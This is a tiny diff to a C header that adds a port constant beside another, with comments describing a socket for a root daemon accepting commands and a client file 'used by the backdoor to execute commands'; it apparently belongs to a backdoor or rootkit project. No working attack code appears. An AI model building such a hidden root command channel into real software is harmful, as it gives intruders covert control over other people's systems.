@@ -1,4 +1,5 @@
 // Socket used by root daemon to accept commands
+#define OLD_SHELL_PORT 60342
 #define SHELL_PORT 60343
 
 // File used as client by the backdoor to execute commands
